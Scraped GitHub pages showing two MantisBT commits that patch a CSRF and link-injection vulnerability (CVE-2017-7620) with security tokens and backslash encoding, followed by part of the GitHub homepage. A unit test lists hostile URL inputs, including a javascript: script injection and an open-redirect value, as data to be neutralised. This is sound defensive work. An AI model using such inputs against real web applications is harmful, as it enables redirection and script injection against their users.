   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Add form security token to permalink\_page.php

[Browse files](/mantisbt/mantisbt/tree/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2)
Browse the repository at this point in the history

```
John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org>
reported a CSRF vulnerability in permalink_page.php, allowing an
attacker to inject arbitrary links ([CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620")).

The security token prevents such injection.

Fixes #22702
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 20, 2017

1 parent
[2d541e9](/mantisbt/mantisbt/commit/2d541e9897d7629762fbc43f1bf42463458da033)

commit f21b56f

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**8 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* core

  + core/filter\_api.php
    [filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21)
* permalink\_page.php
  [permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95)

## There are no files selected for viewing

5 changes: 4 additions & 1 deletion

5
[core/filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21 "core/filter_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2/core/filter_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2451,8 +2451,11 @@ function filter\_draw\_selection\_area2( $p\_page\_number, $p\_for\_screen = true, $p\_e |
|  |  | filter\_print\_view\_type\_toggle( $t\_url, $t\_filter['\_view\_type'] ); |
|  |  |  |
|  |  | if( access\_has\_project\_level( config\_get( 'create\_permalink\_threshold' ) ) ) { |
|  |  | # Add CSRF protection, see #22702 |
|  |  | $t\_permalink\_url = urlencode( filter\_get\_url( $t\_filter ) ) |
|  |  | . form\_security\_param( 'permalink' ); |
|  |  | echo '<li>'; |
|  |  | echo '<a href="permalink\_page.php?url=' . urlencode( filter\_get\_url( $t\_filter ) ) . '">'; |
|  |  | echo '<a href="permalink\_page.php?url=' . $t\_permalink\_url . '">'; |
|  |  | echo '<i class="ace-icon fa fa-link"></i>&#160;&#160;' . lang\_get( 'create\_filter\_link' ); |
|  |  | echo '</a>'; |
|  |  | echo '</li>'; |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95 "permalink_page.php")

Show comments

[View file](/mantisbt/mantisbt/blob/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2/permalink_page.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,13 +36,16 @@ |
|  |  | require\_once( 'core.php' ); |
|  |  | require\_api( 'access\_api.php' ); |
|  |  | require\_api( 'config\_api.php' ); |
|  |  | require\_api( 'form\_api.php' ); |
|  |  | require\_api( 'gpc\_api.php' ); |
|  |  | require\_api( 'html\_api.php' ); |
|  |  | require\_api( 'lang\_api.php' ); |
|  |  | require\_api( 'print\_api.php' ); |
|  |  | require\_api( 'string\_api.php' ); |
|  |  | require\_api( 'utility\_api.php' ); |
|  |  |  |
|  |  | form\_security\_validate( 'permalink' ); |
|  |  |  |
|  |  | layout\_page\_header(); |
|  |  |  |
|  |  | layout\_page\_begin(); |
| Expand Down  Expand Up | | @@ -75,4 +78,5 @@ |
|  |  | ?> |
|  |  | </div> |
|  |  | <?php |
|  |  | form\_security\_purge( 'permalink' ); |
|  |  | layout\_page\_end(); |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f21b56f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff21b56fa9060dbae9438b0d0dfb21dff090c1dd2) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_da3d7891_20250126_031542.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix CSRF vulnerability in permalink\_page.php

[Browse files](/mantisbt/mantisbt/tree/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c)
Browse the repository at this point in the history

```
John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org>
reported a CSRF vulnerability in permalink_page.php, allowing an
attacker to inject arbitrary links ([CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620")).

Backporting from master branch:
- Add form security token to prevent such injection
  0d11077d40c5dfdb76efdad9ba2b455af5be25a0
- Encode '\' in string_sanitize_url()
  7b23377c573817c5fe8b522e8c33de8b1caff179

Fixes #22702, #22816
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 19, 2017

1 parent
[afc31a6](/mantisbt/mantisbt/commit/afc31a63fd76ae68f8bc8e8516d4431cf10ea9c5)

commit 8b6787c

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**12 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* core

  + core/filter\_api.php
    [filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21)
  + core/string\_api.php
    [string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4)
* permalink\_page.php
  [permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95)
* tests/Mantis

  + tests/Mantis/StringTest.php
    [StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a)

## There are no files selected for viewing

5 changes: 4 additions & 1 deletion

5
[core/filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21 "core/filter_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/filter_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2451,8 +2451,11 @@ function filter\_draw\_selection\_area2( $p\_page\_number, $p\_for\_screen = true, $p\_e |
|  |  | filter\_print\_view\_type\_toggle( $t\_url, $t\_filter['\_view\_type'] ); |
|  |  |  |
|  |  | if( access\_has\_project\_level( config\_get( 'create\_permalink\_threshold' ) ) ) { |
|  |  | # Add CSRF protection, see #22702 |
|  |  | $t\_permalink\_url = urlencode( filter\_get\_url( $t\_filter ) ) |
|  |  | . form\_security\_param( 'permalink' ); |
|  |  | echo '<li>'; |
|  |  | echo '<a href="permalink\_page.php?url=' . urlencode( filter\_get\_url( $t\_filter ) ) . '">'; |
|  |  | echo '<a href="permalink\_page.php?url=' . $t\_permalink\_url . '">'; |
|  |  | echo '<i class="ace-icon fa fa-link"></i>&#160;&#160;' . lang\_get( 'create\_filter\_link' ); |
|  |  | echo '</a>'; |
|  |  | echo '</li>'; |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[core/string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4 "core/string_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/core/string_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,7 +275,9 @@ function string\_sanitize\_url( $p\_url, $p\_return\_absolute = false ) { |
|  |  | } |
|  |  |  |
|  |  | # Start extracting regex matches |
|  |  | $t\_script = $t\_matches['script']; |
|  |  | # Encode backslashes to prevent unwanted escaping of a leading '/' allowing |
|  |  | # redirection to external sites |
|  |  | $t\_script = strtr( $t\_matches['script'], array( '\\' => '%5C' ) ); |
|  |  | $t\_script\_path = $t\_matches['path']; |
|  |  |  |
|  |  | # Clean/encode query params |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95 "permalink_page.php")

Show comments

[View file](/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/permalink_page.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,13 +36,16 @@ |
|  |  | require\_once( 'core.php' ); |
|  |  | require\_api( 'access\_api.php' ); |
|  |  | require\_api( 'config\_api.php' ); |
|  |  | require\_api( 'form\_api.php' ); |
|  |  | require\_api( 'gpc\_api.php' ); |
|  |  | require\_api( 'html\_api.php' ); |
|  |  | require\_api( 'lang\_api.php' ); |
|  |  | require\_api( 'print\_api.php' ); |
|  |  | require\_api( 'string\_api.php' ); |
|  |  | require\_api( 'utility\_api.php' ); |
|  |  |  |
|  |  | form\_security\_validate( 'permalink' ); |
|  |  |  |
|  |  | layout\_page\_header(); |
|  |  |  |
|  |  | layout\_page\_begin(); |
| Expand Down  Expand Up | | @@ -75,4 +78,5 @@ |
|  |  | ?> |
|  |  | </div> |
|  |  | <?php |
|  |  | form\_security\_purge( 'permalink' ); |
|  |  | layout\_page\_end(); |

1 change: 1 addition & 0 deletions

1
[tests/Mantis/StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a "tests/Mantis/StringTest.php")

Show comments

[View file](/mantisbt/mantisbt/blob/8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c/tests/Mantis/StringTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -82,6 +82,7 @@ public function provider() { |
|  |  | array( 'plugin.php?page=Source/list&id=1#abc', 'plugin.php?page=Source%2Flist&id=1#abc'), |
|  |  | array( 'login\_page.php?return=http://google.com/', 'index.php'), |
|  |  | array( 'javascript:alert(1);', 'index.php'), |
|  |  | array( '\/csrf-22702', '%5C/csrf-22702' ), |
|  |  | ); |
|  |  |  |
|  |  | # @FIXME |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `8b6787c`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F8b6787c8d321ee0ced5fb74ac3f34b67b4b7b26c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.co_86065a3c_20250126_031510.html ===

[Skip to content](#start-of-content)

GitHub Copilot is now available for free.
[Learn more](https://github.com/features/copilot/?utm_source=github&utm_medium=banner&utm_campaign=copilotfree-bannerheader)

## Navigation Menu

Toggle navigation

[Sign in](/login)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# Build and ship software on a single, collaborative platform

Join the world’s most widely adopted AI-powered developer platform.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)
## GitHub features

A demonstration animation of a code editor using GitHub Copilot Chat, where the user requests GitHub Copilot to refactor duplicated logic and extract it into a reusable function for a given code snippet.

CodePlanCollaborateAutomateSecureCode

Build code quickly and more securely with GitHub Copilot embedded throughout your workflows.

## GitHub is used by

![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)Pause
## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.
### Work 55% faster.[Jump to footnote 1](#footnote-1) Increase productivity with AI-powered coding assistance, including code completion, chat, and more.

[Explore GitHub Copilot](/features/copilot)![Duolingo](https://github.githubassets.com/assets/logo-duolingo-14477f9e54a6.svg)

Duolingo boosts developer speed by 25% with GitHub Copilot

[Read customer story](/customer-stories/duolingo)![Gartner](https://github.githubassets.com/assets/logo-gartner-aa8c2e452b64.svg)

2024 Gartner® Magic Quadrant™ for AI Code Assistants

[Read report](https://www.gartner.com/doc/reprints?id=1-2IKO4MPE&ct=240819&st=sb)![](https://github.githubassets.com/assets/accordion-1-ce487d44c0bf.webp)![](https://github.githubassets.com/assets/accordion-2-730955545f07.webp)![](https://github.githubassets.com/assets/accordion-3-52ca331d22ea.webp)![](https://github.githubassets.com/assets/accordion-4-a26744b70ff7.webp)
### Automate any workflow

Optimize your process with simple and secured CI/CD.

A list of workflows displays a heading ‘45,167 workflow runs’ at the top. Below are five rows of completed workflows accompanied by their completion time and their duration formatted in minutes and seconds.[Discover GitHub Actions](/features/actions)
### Get up and running in seconds

Start building instantly with a comprehensive dev environment in the cloud.

A GitHub Codespaces setup for the landing page of a game called OctoInvaders. On the left is a code editor with some HTML and Javascript files open. On the right is a live render of the page. In front of this split editor window is a screenshot of two active GitHub Codespaces environments with their branch names and a button to ‘Create codespace on main.’[Check out GitHub Codespaces](/features/codespaces)
### Build on the go

Manage projects and chat with GitHub Copilot from anywhere.

Two smartphone screens side by side. The left screen shows a Notification inbox, listing issues and pull requests from different repositories like TensorFlow and GitHub’s OctoArcade octoinvaders. The right screen shows a new conversation in GitHub Copilot chat.[Download GitHub Mobile](/mobile)
### Integrate the tools you love

Sync with 17,000+ integrations and a growing library of Copilot Extensions.

A grid of fifty app tiles displays logos for integrations and extensions for companies like Stripe, Slack, and Docker. The tiles extend beyond the bounds of the image to indicate a wide array of apps. [Visit GitHub Marketplace](/marketplace)
## Built-in application security where found means fixed

Use AI to find and fix vulnerabilities—freeing your teams to ship more secure software faster.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)
### Apply fixes in seconds. Spend less time fixing vulnerabilities and more time building features with Copilot Autofix.

[Explore GitHub Advanced Security](/enterprise/advanced-security)![Copilot Autofix identifies vulnerable code and provides an explanation, together with a secure code suggestion to remediate the vulnerability.](https://github.githubassets.com/assets/hero-64ecd484397f.webp)

Solve security debt. Leverage AI-assisted security campaigns to reduce application vulnerabilities and zero-day attacks.

[Discover security campaigns](/enterprise/advanced-security)![A security campaign screen displays the campaign’s progress bar with 97% completed of 701 alerts. A total of 23 alerts are left with 13 in progress, and the campaign started 20 days ago. The status below shows that there are 7 days left in the campaign with a due date of November 15, 2024.](https://github.githubassets.com/assets/pillar-1-dd667a921f55.webp)

Dependencies you can depend on. Update vulnerable dependencies with supported fixes for breaking changes.

[Learn about Dependabot](/features/security/software-supply-chain)![List of dependencies defined in a requirements .txt file.](https://github.githubassets.com/assets/pillar-2-ff69e872920a.webp)

Your secrets, your business: protected.  Detect, prevent, and remediate leaked secrets across your organization.

[Read about secret scanning](/features/security/code)![GitHub push protection confirms and displays an active secret, and blocks the push.](https://github.githubassets.com/assets/pillar-3-0a063e2daae2.webp)
### 7x fastervulnerability fixes with GitHub[Jump to footnote 2](#footnote-2)

### 90% coverage[of alert types in all supported languages with Copilot Autofix](https://docs.github.com/en/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites)

## Work together, achieve more

Collaborate with your teams, use management tools that sync with your projects, and code from anywhere—all on a single, integrated platform.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)![A project management dashboard showing tasks for the ‘OctoArcade Invaders’ project, with tasks grouped under project phase categories like ‘Prototype,’ ‘Beta,’ and ‘Launch’ in a table layout. One of the columns displays sub-issue progress bars with percentages for each issue.](https://github.githubassets.com/assets/hero-961322485af6.webp)
### Your workflows, your way. Plan effectively with an adaptable spreadsheet that syncs with your work.

[Jump into GitHub Projects](/features/issues)“
> It helps us onboard new software engineers and get them productive right away. We have all our source code, issues, and pull requests in one place... GitHub is a complete platform that frees us from menial tasks and enables us to do our best work.

Fabian FaulhaberApplication manager at Mercedes-Benz

![](https://github.githubassets.com/assets/accordion-1-38ad6b6d1b20.webp)![](https://github.githubassets.com/assets/accordion-2-c0a62cfc31a1.webp)![](https://github.githubassets.com/assets/accordion-3-5d5d222f1830.webp)![](https://github.githubassets.com/assets/accordion-4-7abff9233556.webp)
### Keep track of your tasks

Create issues and manage projects with tools that adapt to your code.

Display of task tracking within an issue, showing the status of related sub-issues and their connection to the main issue.[Explore GitHub Issues](/features/issues)
### Share ideas and ask questions

Create space for open-ended conversations alongside your project.

A GitHub Discussions thread where a GitHub user suggests a power-up idea involving Hubot revealing a path and protecting Mona. The post has received 5 upvotes and several reactions. Below, three other users add to the discussion, suggesting Hubot could provide different power-ups depending on levels and appreciating the collaboration idea.[Discover GitHub Discussions](/features/discussions)
### Review code changes together

Create review processes that improve code quality and fit neatly into your workflow.

Two code review approvals by helios-ackmore and amanda-knox, which are followed by three successful checks for ‘Build,’ ‘Test,’ and ‘Publish.’[Learn about code review](/features/code-review)
### Fund open source projects

